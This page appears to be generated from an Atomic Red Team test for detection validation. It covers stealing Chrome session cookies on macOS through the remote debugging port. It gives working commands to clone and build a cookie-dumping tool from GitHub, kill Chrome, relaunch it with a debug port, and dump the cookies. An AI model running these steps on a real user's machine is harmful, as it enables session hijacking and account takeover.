---
atomic_guid: "e43cfdaf-3fb8-4a45-8de0-7eee8741d072"
title: "Steal Chrome Cookies via Remote Debugging (Mac)"
framework: "atomic"
generated: "true"
attack_technique_id: "T1539"
attack_technique_name: "Steal Web Session Cookie"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1539/T1539.yaml"
build_date: "2026-04-27 19:12:27"
executor: "bash"
aliases:
  - "e43cfdaf-3fb8-4a45-8de0-7eee8741d072"
  - "Steal Chrome Cookies via Remote Debugging (Mac)"
platforms:
  - "macos"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

The remote debugging functionality in Chrome can be used by malware for post-exploitation activities to obtain cookies without requiring keychain access. By initiating Chrome with a remote debug port, an attacker can sidestep encryption and employ Chrome's own mechanisms to access cookies.

If successful, this test will output a list of cookies.

Note: Chrome processes will be killed during this test.

See https://posts.specterops.io/hands-in-the-cookie-jar-dumping-cookies-with-chromiums-remote-debugger-port-34c4f468844e

## ATT&CK Mapping

- [[kb/attack/techniques/T1539-steal_web_session_cookie|T1539: Steal Web Session Cookie]]

## Dependencies

Install Go

### Prerequisite Check

```bash
go version
```

### Get Prerequisite

```bash
brew install go
```

Download and compile WhiteChocolateMacademiaNut

### Prerequisite Check

```bash
/tmp/WhiteChocolateMacademiaNut/chocolate -h
```

### Get Prerequisite

```bash
git clone https://github.com/slyd0g/WhiteChocolateMacademiaNut.git /tmp/WhiteChocolateMacademiaNut
cd /tmp/WhiteChocolateMacademiaNut
go mod init chocolate
go mod tidy
go build
```

## Executor

- elevation_required: False
- name: bash

### Command

```bash
killall 'Google Chrome'
sleep 1
open -a "/Applications/Google Chrome.app/Contents/MacOS/Google Chrome" --args --remote-debugging-port=1337 --remote-allow-origins=http://localhost/
sleep 1
/tmp/WhiteChocolateMacademiaNut/chocolate -d cookies -p 1337
```

### Cleanup

```bash
rm -rf /tmp/WhiteChocolateMacademiaNut
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1539/T1539.yaml)
